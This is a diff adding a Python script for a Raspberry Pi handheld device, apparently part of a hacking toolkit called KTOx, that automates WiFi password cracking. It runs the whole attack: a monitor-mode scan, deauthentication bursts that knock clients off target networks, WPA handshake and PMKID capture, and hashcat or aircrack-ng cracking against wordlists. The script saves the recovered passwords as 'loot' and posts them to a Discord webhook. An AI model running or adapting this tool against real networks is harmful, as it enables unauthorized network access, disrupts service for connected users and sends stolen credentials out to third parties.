@@ -1,0 +1,570 @@
+#!/usr/bin/env python3
+"""
+KTOx - Auto Crack Pipeline (Monitor Mode Debug)
+=================================================
+Author: wickednull
+
+- Enables monitor mode on wlan0/wlan1
+- Displays live airodump-ng output for debugging
+- Parses APs from both CSV and stdout
+- Handshake + PMKID capture
+- Any wordlist via file browser
+
+Controls:
+  UP/DOWN  – scroll targets
+  OK       – start attack
+  KEY1     – toggle deauth burst
+  KEY2     – cycle wordlist / browse
+  KEY3     – exit
+"""
+
+import os
+import sys
+import re
+import time
+import subprocess
+from datetime import datetime
+
+try:
+    import requests
+except ImportError:
+    requests = None
+
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
+import monitor_mode_helper
+
+# ----------------------------------------------------------------------
+# Hardware & LCD
+# ----------------------------------------------------------------------
+try:
+    import RPi.GPIO as GPIO
+    import LCD_1in44
+    from PIL import Image, ImageDraw, ImageFont
+    HAS_HW = True
+except ImportError:
+    HAS_HW = False
+    print("KTOx hardware not found")
+    sys.exit(1)
+
+PINS = {
+    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
+    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
+}
+GPIO.setmode(GPIO.BCM)
+for pin in PINS.values():
+    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
+
+LCD = LCD_1in44.LCD()
+LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
+W, H = 128, 128
+
+def font(size=9):
+    try:
+        return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", size)
+    except:
+        return ImageFont.load_default()
+
+f9 = font(9)
+
+# ----------------------------------------------------------------------
+# Directories & webhook
+# ----------------------------------------------------------------------
+KTOX_DIR = os.environ.get("KTOX_DIR", "/root/KTOx")
+LOOT_DIR = os.path.join(KTOX_DIR, "loot", "AutoCrack")
+os.makedirs(LOOT_DIR, exist_ok=True)
+WEBHOOK_FILE = os.path.join(KTOX_DIR, "discord_webhook.txt")
+
+def webhook(msg):
+    if requests is None:
+        return
+    try:
+        with open(WEBHOOK_FILE) as f:
+            url = f.read().strip()
+        if url:
+            requests.post(url, json={"content": f"**[KTOx AutoCrack]** {msg}"}, timeout=5)
+    except:
+        pass
+
+# ----------------------------------------------------------------------
+# LCD drawing helpers
+# ----------------------------------------------------------------------
+def draw(lines, title="KTOx CRACK", title_color="#8B0000", text_color="#FFBBBB"):
+    img = Image.new("RGB", (W, H), "#0A0000")
+    d = ImageDraw.Draw(img)
+    d.rectangle((0, 0, W, 17), fill=title_color)
+    d.text((4, 3), title[:20], font=f9, fill=(231, 76, 60))
+    y = 20
+    for line in lines[:7]:
+        d.text((4, y), line[:23], font=f9, fill=text_color)
+        y += 12
+    d.rectangle((0, H-12, W, H), fill="#220000")
+    d.text((4, H-10), "UP/DN OK KEY1/2 K3", font=f9, fill="#FF7777")
+    LCD.LCD_ShowImage(img, 0, 0)
+
+def draw_signal(draw_obj, x, y, dbm):
+    length = int((dbm + 90) / 60 * 24)
+    length = max(0, min(24, length))
+    draw_obj.rectangle((x, y, x+length, y+6), fill=(30, 132, 73))
+    draw_obj.rectangle((x+length, y, x+24, y+6), fill=(34, 0, 0))
+    draw_obj.text((x+26, y-1), str(dbm), font=f9, fill="#AAA")
+
+def wait_btn(timeout=0.1):
+    start = time.time()
+    while time.time() - start < timeout:
+        for name, pin in PINS.items():
+            if GPIO.input(pin) == 0:
+                time.sleep(0.05)
+                return name
+        time.sleep(0.02)
+    return None
+
+# ----------------------------------------------------------------------
+# File browser (KTOx themed)
+# ----------------------------------------------------------------------
+def browse_file(start="/", exts=[".txt"]):
+    path = os.path.abspath(start)
+    hist = []
+    sel = 0
+    scroll = 0
+    rows = 8
+
+    def list_dir(p):
+        try:
+            items = sorted(os.listdir(p))
+            dirs = [d for d in items if os.path.isdir(os.path.join(p, d))]
+            files = [f for f in items if os.path.isfile(os.path.join(p, f))]
+            if exts:
+                files = [f for f in files if any(f.lower().endswith(e) for e in exts)]
+            return dirs + files
+        except:
+            return []
+
+    def redraw(entries, s, sc, cur):
+        img = Image.new("RGB", (W, H), "#0A0000")
+        d = ImageDraw.Draw(img)
+        d.rectangle((0, 0, W, 16), fill="#8B0000")
+        header = cur if len(cur) < 20 else "..." + cur[-17:]
+        d.text((2, 2), header[:20], font=f9, fill="#FF9999")
+        y = 20
+        for i in range(rows):
+            idx = sc + i
+            if idx >= len(entries):
+                break
+            name = entries[idx]
+            if len(name) > 20:
+                name = name[:18] + ".."
+            color = "#FFFF00" if idx == s else "#FFBBBB"
+            if os.path.isdir(os.path.join(cur, name)):
+                name = "/" + name
+            d.text((4, y), name, font=f9, fill=color)
+            y += 11
+        d.rectangle((0, H-12, W, H), fill="#220000")
+        d.text((2, H-10), "UP/DOWN OK K3=back", font=f9, fill="#FF7777")
+        LCD.LCD_ShowImage(img, 0, 0)
+
+    def get_btn():
+        while True:
+            for n, p in PINS.items():
+                if GPIO.input(p) == 0:
+                    time.sleep(0.05)
+                    return n
+            time.sleep(0.02)
+
+    while True:
+        entries = list_dir(path)
+        if not entries:
+            img = Image.new("RGB", (W, H), "#0A0000")
+            d = ImageDraw.Draw(img)
+            d.text((4, 50), "Empty folder", font=f9, fill="#FF8888")
+            d.text((4, 70), "K3 to go back", font=f9, fill=(113, 125, 126))
+            LCD.LCD_ShowImage(img, 0, 0)
+            while True:
+                btn = get_btn()
+                if btn == "KEY3":
+                    if hist:
+                        path = hist.pop()
+                        break
+                    else:
+                        return None
+                time.sleep(0.05)
+            continue
+
+        redraw(entries, sel, scroll, path)
+        btn = get_btn()
+        if btn == "KEY3":
+            if hist:
+                path = hist.pop()
+                sel = 0
+                scroll = 0
+            else:
+                return None
+        elif btn == "UP":
+            sel = (sel - 1) % len(entries)
+            if sel < scroll:
+                scroll = sel
+        elif btn == "DOWN":
+            sel = (sel + 1) % len(entries)
+            if sel >= scroll + rows:
+                scroll = sel - rows + 1
+        elif btn == "OK":
+            selected = entries[sel]
+            full = os.path.join(path, selected)
+            if os.path.isdir(full):
+                hist.append(path)
+                path = full
+                sel = 0
+                scroll = 0
+            else:
+                return full
+        time.sleep(0.05)
+
+# ----------------------------------------------------------------------
+# System helpers
+# ----------------------------------------------------------------------
+def run(cmd, timeout=30):
+    try:
+        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+        return r.stdout + r.stderr
+    except:
+        return ""
+
+def get_wlan():
+    for iface in ["wlan0", "wlan1"]:
+        if os.path.exists(f"/sys/class/net/{iface}"):
+            return iface
+    return None
+
+def enable_monitor_mode(iface):
+    return monitor_mode_helper.activate_monitor_mode(iface)
+
+def disable_monitor_mode(iface):
+    monitor_mode_helper.deactivate_monitor_mode(iface)
+
+# ----------------------------------------------------------------------
+# AP scanning with debug output
+# ----------------------------------------------------------------------
+def scan_aps_debug(mon):
+    """Show live airodump-ng output for 10 seconds, then parse APs."""
+    draw([f"Starting scan on {mon}", "Showing live data...", "Press any key to stop"], title="SCAN DEBUG")
+    tmp = f"/tmp/ktox_scan_{int(time.time())}"
+    # Run airodump-ng, capture both CSV and terminal output
+    proc = subprocess.Popen(
+        f"airodump-ng --output-format csv -w {tmp} {mon}",
+        shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
+    )
+    start = time.time()
+    lines_to_show = []
+    while time.time() - start < 15:
+        # Read a line from stdout (if any)
+        try:
+            line = proc.stdout.readline()
+            if line:
+                lines_to_show.append(line.strip())
+                # Keep only last 6 lines for display
+                if len(lines_to_show) > 6:
+                    lines_to_show.pop(0)
+                # Update LCD with these lines
+                img = Image.new("RGB", (W, H), "#0A0000")
+                d = ImageDraw.Draw(img)
+                d.rectangle((0, 0, W, 17), fill="#8B0000")
+                d.text((4, 3), "LIVE SCAN", font=f9, fill=(231, 76, 60))
+                y = 20
+                for l in lines_to_show[-6:]:
+                    d.text((4, y), l[:23], font=f9, fill=(171, 178, 185))
+                    y += 12
+                d.rectangle((0, H-12, W, H), fill="#220000")
+                d.text((4, H-10), "Scanning...", font=f9, fill="#FF7777")
+                LCD.LCD_ShowImage(img, 0, 0)
+        except:
+            pass
+        # Check for button press to abort early
+        if wait_btn(0.05) is not None:
+            break
+        time.sleep(0.1)
+
+    proc.terminate()
+    time.sleep(1)
+
+    # Now parse CSV file
+    csv_file = f"{tmp}-01.csv"
+    aps = []
+    if os.path.exists(csv_file):
+        with open(csv_file, errors="ignore") as f:
+            lines = f.readlines()
+        # Find the line that contains BSSID
+        for line in lines:
+            if line.startswith("BSSID"):
+                continue
+            if re.match(r"([0-9A-Fa-f]{2}:){5}", line.strip()):
+                parts = [p.strip() for p in line.split(",")]
+                if len(parts) >= 14:
+                    bssid = parts[0]
+                    ch = parts[3]
+                    pwr = parts[8]
+                    essid = parts[13]
+                    if essid and essid != "(not associated)":
+                        try:
+                            sig = int(pwr)
+                        except:
+                            sig = -90
+                        aps.append((bssid, ch, essid, sig))
+    # Cleanup
+    for f in [csv_file, f"{tmp}-01.kismet.csv", f"{tmp}-01.kismet.netxml"]:
+        try: os.remove(f)
+        except: pass
+    return aps
+
+# ----------------------------------------------------------------------
+# Handshake capture
+# ----------------------------------------------------------------------
+def capture_hs(mon, bssid, ch, essid, deauth):
+    safe = re.sub(r"[^a-zA-Z0-9_-]", "_", essid)[:20]
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    out = os.path.join(LOOT_DIR, f"{safe}_{ts}")
+    os.makedirs(out, exist_ok=True)
+    cap = os.path.join(out, "capture")
+    draw([f"Target: {essid[:16]}", f"CH:{ch} {bssid}", "Capturing handshake..."])
+    proc = subprocess.Popen(
+        f"airodump-ng -c {ch} --bssid {bssid} -w {cap} --output-format pcap {mon}",
+        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    if deauth:
+        time.sleep(5)
+        draw(["Sending deauth..."])
+        run(f"aireplay-ng --deauth 10 -a {bssid} {mon}")
+    time.sleep(20)
+    proc.terminate()
+    time.sleep(1)
+    caps = [f for f in os.listdir(out) if f.endswith(".cap")]
+    if caps:
+        return os.path.join(out, caps[0]), out
+    return None, out
+
+def capture_pmkid(mon, bssid, ch, essid):
+    safe = re.sub(r"[^a-zA-Z0-9_-]", "_", essid)[:20]
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    out = os.path.join(LOOT_DIR, f"pmkid_{safe}_{ts}")
+    os.makedirs(out, exist_ok=True)
+    pcapng = os.path.join(out, "capture.pcapng")
+    draw(["PMKID capture", f"ESSID: {essid[:16]}", "Using hcxdumptool..."])
+    run(f"hcxdumptool -i {mon} -o {pcapng} -c {ch} --filterlist={bssid} --filtermode=2", timeout=120)
+    hashfile = os.path.join(out, "pmkid.16800")
+    run(f"hcxpcaptool -z {hashfile} {pcapng}")
+    if os.path.exists(hashfile) and os.path.getsize(hashfile) > 0:
+        return hashfile, out
+    return None, out
+
+def validate(cap):
+    out = run(f"aircrack-ng {cap} 2>/dev/null")
+    return "handshake" in out.lower()
+
+# ----------------------------------------------------------------------
+# Cracking
+# ----------------------------------------------------------------------
+def crack_hashcat(hash_file, mode, wordlist, essid):
+    draw([f"Cracking with hashcat", f"Mode {mode}", "0%"], title_color="#444400")
+    cmd = f"hashcat -m {mode} {hash_file} {wordlist} --force --status --status-timer=5 --potfile-disable"
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+    pwd = None
+    deadline = time.time() + 300
+    try:
+        while time.time() < deadline and proc.poll() is None:
+            line = proc.stdout.readline()
+            if not line:
+                break
+            if "STATUS" in line:
+                m = re.search(r'(\d+\.?\d*)%', line)
+                if m:
+                    draw([f"Cracking... {m.group(1)}%", f"Wordlist: {os.path.basename(wordlist)}", "K1=stop"], title_color="#444400")
+            if ":" in line and essid in line:
+                parts = line.strip().split(":")
+                if len(parts) >= 2:
+                    pwd = parts[-1]
+                    break
+    except (OSError, IOError):
+        pass
+    finally:
+        if proc.poll() is None:
+            proc.terminate()
+    return pwd
+
+def crack_aircrack(cap, wordlist):
+    out = run(f"aircrack-ng -w {wordlist} {cap} 2>/dev/null", timeout=300)
+    m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", out)
+    return m.group(1) if m else None
+
+def crack_handshake(cap, essid, wl):
+    hccapx = cap.replace(".cap", ".hccapx")
+    run(f"cap2hccapx {cap} {hccapx}")
+    if os.path.exists(hccapx):
+        pwd = crack_hashcat(hccapx, 2500, wl, essid)
+        if pwd:
+            return pwd
+    return crack_aircrack(cap, wl)
+
+def crack_pmkid_file(pmkid, essid, wl):
+    return crack_hashcat(pmkid, 16800, wl, essid)
+
+# ----------------------------------------------------------------------
+# Wordlist manager
+# ----------------------------------------------------------------------
+def get_predefined():
+    cand = [
+        ("rockyou", "/usr/share/wordlists/rockyou.txt"),
+        ("custom", "/root/KTOx/loot/wordlists/custom.txt"),
+        ("default", "/usr/share/john/password.lst"),
+    ]
+    return [(n, p) for n, p in cand if os.path.exists(p)]
+
+# ----------------------------------------------------------------------
+# Main
+# ----------------------------------------------------------------------
+def main():
+    # Find wireless interface
+    iface = get_wlan()
+    if not iface:
+        draw(["No wireless card", "Check wlan0/wlan1", "KEY3 to exit"], text_color="#FF4444")
+        while wait_btn(0.5) != "KEY3":
+            pass
+        return
+
+    # Enable monitor mode
+    draw([f"Interface: {iface}", "Enabling monitor mode..."])
+    mon = enable_monitor_mode(iface)
+    if not mon:
+        draw(["Monitor mode failed", "Check airmon-ng", "KEY3 to exit"], text_color="#FF4444")
+        while wait_btn(0.5) != "KEY3":
+            pass
+        return
+    draw([f"Monitor: {mon}", "Testing..."])
+    time.sleep(1)
+
+    # Scan for APs with live debug output
+    aps = scan_aps_debug(mon)
+    if not aps:
+        draw(["No APs found", "Try moving closer", "or check interface", "KEY3 to exit"], text_color="#FF8888")
+        while wait_btn(0.5) != "KEY3":
+            pass
+        return
+
+    cursor = 0
+    deauth = True
+    pre = get_predefined()
+    wl_items = pre + [("[Browse...]", None)]
+    wl_idx = 0
+    wl_path = pre[0][1] if pre else None
+    wl_name = pre[0][0] if pre else "None"
+
+    # Target selection loop
+    while True:
+        bssid, ch, essid, sig = aps[cursor]
+        wl_disp = wl_name if wl_idx < len(pre) else "Browse..."
+        lines = [
+            f"> {essid[:18]}",
+            f"  {bssid}",
+            f"  CH:{ch}  {sig}dBm",
+            f"  {cursor+1}/{len(aps)}  WL:{wl_disp[:6]}",
+            "",
+            "OK=start  KEY2=WL",
+            f"KEY1=deauth:{'ON' if deauth else 'OFF'}"
+        ]
+        img = Image.new("RGB", (W, H), "#0A0000")
+        d = ImageDraw.Draw(img)
+        d.rectangle((0, 0, W, 17), fill="#8B0000")
+        d.text((4, 3), "SELECT TARGET", font=f9, fill=(231, 76, 60))
+        y = 20
+        for i, line in enumerate(lines):
+            d.text((4, y), line[:23], font=f9, fill=(171, 178, 185))
+            if i == 2:
+                draw_signal(d, 80, y, sig)
+            y += 12
+        d.rectangle((0, H-12, W, H), fill="#220000")
+        d.text((4, H-10), "UP/DN OK KEY1/2 K3", font=f9, fill="#FF7777")
+        LCD.LCD_ShowImage(img, 0, 0)
+
+        btn = wait_btn(0.5)
+        if btn == "UP":
+            cursor = (cursor - 1) % len(aps)
+        elif btn == "DOWN":
+            cursor = (cursor + 1) % len(aps)
+        elif btn == "KEY1":
+            deauth = not deauth
+        elif btn == "KEY2":
+            old = wl_idx
+            wl_idx = (wl_idx + 1) % len(wl_items)
+            if wl_items[wl_idx][1] is None:
+                f = browse_file("/", [".txt"])
+                if f:
+                    wl_path = f
+                    wl_name = os.path.basename(f)[:12]
+                else:
+                    wl_idx = old
+            else:
+                wl_path = wl_items[wl_idx][1]
+                wl_name = wl_items[wl_idx][0]
+        elif btn == "KEY3":
+            disable_monitor_mode(iface)
+            GPIO.cleanup()
+            return
+        elif btn == "OK":
+            break
+        time.sleep(0.05)
+
+    bssid, ch, essid, sig = aps[cursor]
+    if not wl_path or not os.path.exists(wl_path):
+        draw(["Invalid wordlist", "KEY3 to exit"], text_color="#FF4444")
+        while wait_btn(0.5) != "KEY3":
+            pass
+        return
+
+    # Capture handshake
+    cap_file, out_dir = capture_hs(mon, bssid, ch, essid, deauth)
+    is_pmkid = False
+    if cap_file:
+        draw(["Validating handshake..."])
+        if not validate(cap_file):
+            draw(["Handshake invalid", "Trying PMKID..."], text_color="#FF8800")
+            webhook(f"Handshake invalid for {essid}, trying PMKID")
+            pmkid, pmkid_dir = capture_pmkid(mon, bssid, ch, essid)
+            if pmkid:
+                cap_file = pmkid
+                out_dir = pmkid_dir
+                is_pmkid = True
+            else:
+                draw(["PMKID capture failed", "KEY3 to exit"], text_color="#FF4444")
+                webhook(f"Capture failed for {essid}")
+                while wait_btn(0.5) != "KEY3":
+                    pass
+                return
+    else:
+        draw(["Handshake capture failed", "KEY3 to exit"], text_color="#FF4444")
+        webhook(f"Capture failed for {essid}")
+        while wait_btn(0.5) != "KEY3":
+            pass
+        return
+
+    # Crack
+    webhook(f"Captured {essid} ({bssid}) – cracking with {wl_name}")
+    draw(["Starting crack...", f"Wordlist: {wl_name}"])
+    if is_pmkid:
+        pwd = crack_pmkid_file(cap_file, essid, wl_path)
+    else:
+        pwd = crack_handshake(cap_file, essid, wl_path)
+
+    if pwd:
+        draw([f"SUCCESS!", f"{essid[:16]}", f"PASS: {pwd[:18]}"], title_color="#00AA00")
+        webhook(f"Cracked {essid} → {pwd}")
+        with open(os.path.join(out_dir, "cracked.txt"), "w") as f:
+            f.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {pwd}\nWordlist: {wl_name}\nDate: {datetime.now().isoformat()}\n")
+    else:
+        draw(["FAILED", "Not cracked", f"Saved in {os.path.basename(out_dir)}"], text_color="#FF8800")
+        webhook(f"Not cracked for {essid} with {wl_name}")
+
+    while wait_btn(0.5) != "KEY3":
+        pass
+
+    disable_monitor_mode(iface)
+    GPIO.cleanup()
+
+if __name__ == "__main__":
+    main()
